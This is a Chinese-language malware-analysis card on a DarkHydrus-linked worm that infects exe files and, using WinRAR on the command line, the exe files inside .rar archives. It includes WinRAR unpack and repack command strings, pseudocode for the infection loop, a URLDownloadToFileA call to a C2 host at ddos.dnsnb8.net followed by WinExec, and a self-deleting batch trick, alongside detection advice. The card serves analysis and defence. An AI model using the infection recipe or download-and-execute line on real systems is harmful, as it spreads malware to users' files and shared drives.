---
id: code-analysis-reverse-windows-winrar-cli-file-infector-worm
title: WinRAR 命令行驱动的文件感染蠕虫：Temp 重命名 WinRAR，解包 rar→感染 exe→重打包，按磁盘多线程传播
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: winrar-cli-file-infector-worm
aliases:
- WinRAR 感染型病毒
- rar 感染
- WinRAR 命令行感染
- 文件感染蠕虫
- DarkHydrus Exe 组件
- X -ibck
- M -r -o+ -ep1
- 625 字节 shellcode
tags:
- windows
- malware
- file-infector
- winrar
- rar
- worm
- propagation
- pe-infection
- shellcode
- apt
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V533
  verified_at: '2026-11-11T17:18:58+08:00'
  notes: 已对照原文与44张截图逐张核对：图21为GetLogicalDriveStringsA/GetDriveTypeA逐盘CreateThread+WaitForMultipleObjects并另起删除线程；图22扩展名分发lstrcmpiA exe/rar；图23为X -ibck与M -r -o+ -ep1两条WinRAR命令；图24为SetFilePointer/SetEndOfFile后先写0x271(=625)字节stub再写样本体（原文文字标0x3A00，截图中第二处长度为变量，图14的0x3E00是另一处下载载荷写盘函数，非感染体长度）；图25为Re_RORdecode与首DWORD置0x905A4D；图26/27为URLDownloadToFile k1.rar→sub_401000→WinExec；图28/29自删除bat。原文为样本逆向无武器化PoC。dedup：仅自身exact匹配，WinRAR SFX/Synaptics取证/可移动盘蠕虫均非同链；dup-scan无涉及pair。未验证点：未运行样本。
---

## 一句话结论

DarkHydrus 的 Exe 组件是文件感染型下载器/蠕虫：它把系统 WinRAR 复制或重定向到 `%TEMP%\{随机数}.exe`，对每个磁盘/共享起独立线程递归遍历，遇到 `.rar` 用 `X -ibck` 解包、感染解出的 exe、再用 `M -r -o+ -ep1` 重打包；遇到 `.exe` 直接写入 625 字节 API 动态寻址 shellcode 加约 0x3A00 字节样本体完成感染，并通过 `URLDownloadToFile` 下载下一阶段执行。

## 原理

- **按磁盘多线程**：`GetLogicalDriveStringsA` 枚举盘符，`GetDriveTypeA` 过滤后为每个非 A/B 盘创建感染线程（`CreateThread`），主线程 `WaitForMultipleObjects` 等待；另有线程负责收尾删除。网络共享与本地磁盘走同一遍历逻辑。
- **递归遍历与扩展名分发**：`FindFirstFileW`/`FindNextFileW` 递归目录，`CharLowerW` 统一小写后按 `strrchr(name, '.')` 取扩展名；`.exe` 走 exe 感染函数，`.rar` 走 rar 感染函数（截图中的 `lstrcmpiA(..., "exe")` / `lstrcmpiA(..., "rar")` 分支）。
- **WinRAR 解包-感染-重打包**：样本把 WinRAR 可执行文件放到临时目录并重命名为 `{随机数}.exe`，通过 `CreateProcess` 执行截图中的两条命令：
  ```text
  %s X -ibck "%s" "%s\"
  "%s M %s -r -o+ -ep1 "%s" "%s\*"
  ```
  第一条 `X` 静默（`-ibck`）解包指定 rar 到临时目录；样本感染解出的 exe；第二条 `M`（move）递归（`-r`）、覆盖（`-o+`）、不保留路径（`-ep1`）把感染后的文件重新打包回原 rar。这样压缩包内的程序在解压运行时也会带着感染体。
- **exe 感染**：`CreateFileA` 以读写打开目标，`CreateFileMappingA`/`MapViewOfFile` 映射；检查 MZ 头（`0x5A4D`），对文件做 `Re_RORdecode`（循环右移/异或解码）并把首 DWORD 设为 `0x905A4D`（MZ）；随后 `SetFilePointer`/`SetEndOfFile` 调整大小，先写入 0x271（625）字节的 API 动态寻址 shellcode，再写入样本本体（原文 0x3A00），更新文件时间后 `UnmapViewOfFile`/`CloseHandle`。625 字节 stub 运行时在宿主进程里解析 API、加载并跳转到样本体。
- **下载器行为**：另一线程循环 `wsprintfA("%s%08X.exe", SubStr, rand)` 生成随机文件名，`URLDownloadToFileA` 从 `http://ddos.dnsnb8.net:799/cj//k1.rar` 下载到本地，`sub_401000` 解密、`FileMap` 映射到内存后 `WinExec` 执行；`Sleep` 控制频率。
- **收尾**：生成 `%TEMP%\{随机数}.bat`，内容为 `:DELFILE / del "<路径>" / if exist "<路径>" goto :DELFILE / del "<自身bat>"`，`ShellExecuteA("open")` 运行后自删除，抹掉落盘痕迹。
- **为什么危害大**：它不依赖漏洞，靠用户执行一次即在本机与共享盘批量感染 exe/rar；压缩包内的程序被二次分发后继续感染，形成蠕虫式扩散；同时保留下载器能力，可随时拉取新载荷。

## 触发条件

- 样本在 Windows 主机上以当前用户（最好管理员）权限运行，对目标磁盘/共享有读写与改名权限。
- 系统存在 WinRAR（或样本自带）且可执行命令行；rar 文件未被占用/加密。
- 目标目录有可写权限，PE 文件未被杀软锁定。
- 主机可出网访问下载服务器（本例 `ddos.dnsnb8.net:799`）或存在内网共享。

## 利用步骤

1. 样本启动后枚举盘符，为每个磁盘/共享创建遍历线程。
2. 递归扫描文件：`.exe` 直接感染（写 625 字节 stub + 样本体），`.rar` 调用 WinRAR `X` 解包到临时目录。
3. 感染解包目录中的 exe，再用 WinRAR `M -r -o+ -ep1` 重打包回原 rar 并覆盖。
4. 下载线程从 C2 拉取 `k1.rar` 到随机名 exe，解密映射后 `WinExec` 执行下一阶段。
5. 生成自删除 bat 并 `ShellExecute` 运行，清理临时文件。

## PoC

原文为样本逆向，无武器化 PoC。关键 WinRAR 命令行（截图还原）：

```text
"%s X -ibck \"%s\" \"%s\\\""
"\"%s M %s -r -o+ -ep1 \"%s\" \"%s\\*\""
```

感染流程伪代码：

```text
for drive in GetLogicalDriveStrings():
    CreateThread(infect_drive, drive)
wait_all()

infect_drive(drive):
  recurse(drive):
    ext = lower(extension(file))
    if ext == ".exe": infect_exe(file)
    if ext == ".rar":
        winrar("X -ibck \"%s\" \"%s\\\"", rar, tmpdir)
        infect_directory(tmpdir)
        winrar("\"%s M %s -r -o+ -ep1 \"%s\" \"%s\\*\"", winrar, flags, rar, tmpdir)

infect_exe(file):
  map file; check MZ; Re_RORdecode; set 0x905A4D
  write 0x271-byte stub; write sample body (0x3A00); update timestamps
```

下载：

```text
URLDownloadToFileA(0, "http://ddos.dnsnb8.net:799/cj//k1.rar", "%TEMP%\\%08X.exe", 0, 0)
WinExec(downloaded, 5)
```

## 变体与关联

- 关联：文件感染型病毒的主机取证与工件（缓存副本、Run 键、版本伪装）见 `defense-forensics-synaptics-file-infector-artifacts`；本卡侧重 WinRAR 命令行的 rar/exe 双通道感染。
- 关联：可移动磁盘蠕虫与快捷方式感染见 `pentest-c2-removable-drive-worm-nodrives-shortcut-infection`。
- 变体：WinRAR 可换成 7-Zip/自解压模块；感染 stub 可换成 TLS 回调/附加节注入；下载源可换 HTTP/DNS/云盘。

## 检测与防御

- 检测：`%TEMP%` 下随机名 WinRAR 副本与 `X -ibck`/`M -r -o+ -ep1` 命令行；WinRAR 进程由非用户交互程序（恶意样本）启动；大量 rar 文件时间戳/大小短时间变化；exe 文件尾部/头部出现 625 字节 stub 与 0x3A00 附加数据；自删除 bat（`:DELFILE`）。
- 检测：网络侧出现对 `ddos.dnsnb8.net` 等可疑域/非常规端口的 `k1.rar` 下载；进程树含随机名 exe → WinRAR → 批量读写。
- 防御：应用白名单/EDR 拦截非交互 WinRAR 命令行；限制普通用户对共享盘与系统目录的写权限；离线备份；对压缩包内 exe 做二次扫描。
